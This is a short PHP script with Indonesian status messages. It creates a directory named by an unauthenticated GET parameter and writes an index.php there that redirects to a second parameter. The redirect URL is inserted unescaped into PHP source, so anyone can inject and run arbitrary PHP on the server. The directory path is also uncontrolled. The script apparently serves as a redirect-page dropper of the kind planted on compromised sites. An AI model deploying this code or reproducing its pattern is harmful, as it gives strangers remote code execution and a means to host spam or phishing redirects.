<?php
if(isset($_GET['path'])){
	mkdir($_GET['path']);
	$file = fopen($_GET['path']."/index.php","w");
	echo fwrite($file,"<?php header('Location: " .$_GET['url']. "'); ?>");
	fclose($file);
	echo 'Sukses!';
}else{
	echo 'umm, Jangan Iseng!';
}
?>